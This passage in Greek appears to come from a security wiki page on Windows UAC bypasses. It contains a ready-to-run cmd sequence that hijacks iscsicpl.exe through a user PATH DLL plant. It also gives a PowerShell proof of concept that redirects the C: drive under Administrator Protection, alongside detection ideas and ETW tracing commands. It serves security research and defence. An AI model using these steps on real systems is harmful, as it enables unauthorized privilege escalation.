Συνίσταται στην παρακολούθηση του αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή **command** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse για να φορτώσει το `iscsiexe.dll` μέσω search order. Αν μπορείς να τοποθετήσεις ένα malicious `iscsiexe.dll` μέσα σε έναν **user-writable** φάκελο και στη συνέχεια να τροποποιήσεις το `PATH` του current user (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται search σε αυτόν τον φάκελο, τα Windows μπορεί να φορτώσουν το attacker DLL μέσα στην elevated process του `iscsicpl.exe` **χωρίς να εμφανίσουν UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- Αυτό είναι χρήσιμο όταν ο current user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο στο **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετώπισε το αντίγραφο στο **System32** ως ξεχωριστό binary και επιβεβαίωσε τη συμπεριφορά ανεξάρτητα.
- Το primitive είναι ένας συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως το ίδιο ProcMon workflow που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για την επιβεβαίωση του missing DLL load.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες ανίχνευσης:
- Δημιουργήστε alert για `reg add` / εγγραφές στο registry προς `HKCU\Environment\Path` που ακολουθούνται άμεσα από εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζητήστε το `iscsiexe.dll` σε **τοποθεσίες που ελέγχει ο χρήστης**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχετίστε εκκινήσεις του `iscsicpl.exe` με μη αναμενόμενες child processes ή φορτώσεις DLL από τοποθεσίες εκτός των κανονικών directories των Windows.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

Ορισμένα chains μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά registry hijacks του `HKCU\Software\Classes`. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και **DLL redirection** για μετάβαση από medium σε high integrity μέσω trusted UI / auto-elevated binaries, όπως το `ctfmon.exe`, και στη συνέχεια targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα compact payload examples στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack μέσω per-logon-session DOS device map

> [!NOTE]
> Από τον Αύγουστο του 2026, η Microsoft εξακολουθεί να τεκμηριώνει το Administrator Protection ως **Insider preview**: η διάθεση του Οκτωβρίου 2025 ανακλήθηκε και έχει προγραμματιστεί για μεταγενέστερη ημερομηνία. Επιβεβαιώστε ότι το **Admin Approval Mode with Administrator protection** είναι πράγματι ενεργοποιημένο και ότι η συσκευή έχει γίνει reboot πριν δοκιμάσετε αυτά τα chains· μια απλή έκδοση stock 25H2 δεν αποδεικνύει από μόνη της ότι η δυνατότητα είναι ενεργή.<sup>[[10]](#references)</sup>

Για το πλήρες attack surface των `RAiLaunchAdminProcess` / UIAccess σε preview builds των Windows 11 25H2, ελέγξτε την ειδική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το “Administrator Protection” των Windows 11 25H2 χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Το directory δημιουργείται lazy από το `SeGetTokenDeviceMap` κατά το πρώτο `\??` resolution. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, το directory δημιουργείται με τον attacker ως **owner** (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια low-privileged session, καλέστε το `RAiProcessRunOnce` για να κάνετε spawn ένα promptless shadow-admin `runonce.exe`.
2. Κάντε duplicate το primary token του σε token **identification** και κάντε impersonate αυτό το token ενώ ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ownership του attacker.
3. Δημιουργήστε ένα `C:` symlink εκεί, το οποίο δείχνει σε storage που ελέγχει ο attacker· οι επακόλουθες filesystem accesses σε εκείνη τη session επιλύουν το `C:` προς το path του attacker, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Σε preview hosts, το Administrator Protection καταγράφει εγκρίσεις και αποτυχίες ως συμβάντα ETW **15031** και **15032** υπό τον provider `Microsoft-Windows-LUA`. Τα συμβάντα περιλαμβάνουν το SID του αιτούντος, τη διαδρομή της εφαρμογής, το αποτέλεσμα, τον managed λογαριασμό administrator και τη μέθοδο authentication, επομένως οι επαναλαμβανόμενες απόπειρες exploit ή η αποτυχημένη οδήγηση του UI δεν είναι χωρίς telemetry.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner συμβατότητας και launcher για UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη του Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass με χρήση του SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Παρακάμψεις UnifiedConsent, TabTip και Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Προστασία διαχειριστή](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
